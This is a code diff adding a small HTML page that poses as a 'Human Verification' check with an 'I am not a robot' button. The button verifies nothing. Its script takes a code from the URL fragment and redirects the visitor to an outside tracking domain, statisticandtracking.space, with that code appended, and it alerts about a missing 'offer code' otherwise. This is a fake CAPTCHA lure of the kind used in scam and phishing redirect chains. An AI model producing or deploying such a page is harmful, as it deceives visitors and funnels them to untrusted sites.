@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Human Verification</title>
+  <style>
+    body {
+      font-family: Arial;
+      text-align: center;
+      padding-top: 100px;
+    }
+    .verify-box {
+      display: inline-block;
+      padding: 30px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #ccc;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="verify-box">
+    <h2>Human Verification</h2>
+    <p>Please click the button below to continue.</p>
+    <button onclick="verifyAndRedirect()">I am not a robot</button>
+  </div>
+
+  <script>
+    var redirectBase = "http://statisticandtracking.space/rd/";
+    var url = window.location.href;
+    var para = url.substring(url.lastIndexOf('#') + 1);
+
+    function verifyAndRedirect() {
+      if (para) {
+        window.location.href = redirectBase + para;
+      } else {
+        alert("Invalid or missing offer code.");
+      }
+    }
+  </script>
+</body>
+</html>
